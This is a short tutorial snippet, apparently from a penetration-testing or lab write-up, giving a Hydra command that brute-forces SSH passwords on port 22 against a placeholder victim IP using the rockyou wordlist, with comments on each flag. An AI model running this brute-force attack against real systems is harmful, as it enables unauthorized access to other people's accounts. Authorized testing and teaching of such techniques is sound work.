We will use the tool **Hydra**

````
hydra -s 22 -v -V -l user -P /usr/share/wordlists/rockyou.txt -t 8 victim's_ip ssh

#-s designates the port to be used
#-v and -V are for maximum verbosity
#-l selects the login name
#-P selects the wordlist
-t selects the number of parallel tasks or connections
